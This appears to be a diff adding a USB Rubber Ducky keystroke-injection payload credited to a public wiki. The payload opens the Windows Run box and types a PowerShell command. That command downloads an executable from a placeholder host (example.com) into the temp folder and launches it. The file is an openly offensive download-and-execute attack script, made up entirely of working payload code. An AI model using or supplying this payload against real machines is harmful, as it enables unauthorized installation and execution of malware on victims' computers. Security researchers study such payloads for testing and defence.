@@ -1,0 +1,11 @@
+REM Source: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---powershell-wget---execute
+REM Powershell Wget + Execute
+REM Author: mubix
+REM Duckencoder: 1.2
+REM Target: Windows 7
+REM Description: Opens "RUN" box, throws power shell string, enter. Supports HTTP/S, and proxies.
+REM
+GUI r
+DELAY 100
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe'); Start-Process "%TEMP%\bob.exe"
+ENTER
